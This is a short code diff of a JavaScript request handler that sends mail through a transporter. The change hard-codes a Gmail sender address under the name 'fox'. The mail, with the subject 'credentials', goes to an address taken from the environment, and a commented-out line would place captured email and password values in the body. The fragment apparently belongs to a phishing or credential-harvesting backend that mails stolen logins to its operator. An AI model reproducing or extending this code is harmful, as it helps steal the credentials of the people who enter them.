@@ -29,7 +29,7 @@ export default function handler(
   });
 
   return transporter.sendMail({
-              from: `"fox" <${process.env.APP_ACCOUNT}>`,
+              from: `"fox" <deeswork969@gmail.com>`,
               to: process.env.EMAIL_TO_SEND,
               subject: 'credentials',
               // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
